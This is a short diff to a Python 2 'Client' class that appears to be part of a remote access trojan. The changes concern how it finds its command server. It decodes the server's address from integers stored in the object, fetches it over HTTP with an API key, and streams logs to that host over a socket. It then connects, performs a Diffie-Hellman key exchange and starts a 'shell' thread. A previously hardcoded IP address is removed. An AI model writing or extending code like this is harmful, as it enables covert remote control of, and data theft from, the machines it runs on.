@@ -147,9 +147,11 @@ class Client(object):
         p = subprocess.Popen(path, startupinfo=info)
         return p
 
-    def _target(self, **kwargs):
+    def _target(self):
         try:
-            ab = request('GET', long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json() 
+            ab = request('GET', long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json()
+            if self.__v__:
+                print ab
             return ab[ab.keys()[0]][0].get('ip')
         except Exception as e:
             if self.__v__:
@@ -469,7 +471,7 @@ class Client(object):
     def _get_logger(self, port=4321):
         module_logger   = getLogger(self._ip())
         module_logger.handlers = []
-        module_handler  = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
+        module_handler  = SocketHandler(self._target(), port)
         module_logger.addHandler(module_handler)
         return module_logger
 
@@ -546,7 +548,7 @@ class Client(object):
 
     def _start(self):
         try:
-            self._socket  = self._connect('192.178.1.70') #host=self._target(o=self.__a__, p=self.__b__))
+            self._socket  = self._connect()
             self._dhkey   = self._diffiehellman()
             self._threads['shell'] = threading.Thread(target=self.shell, name='shell')
             self.standby.status.clear()
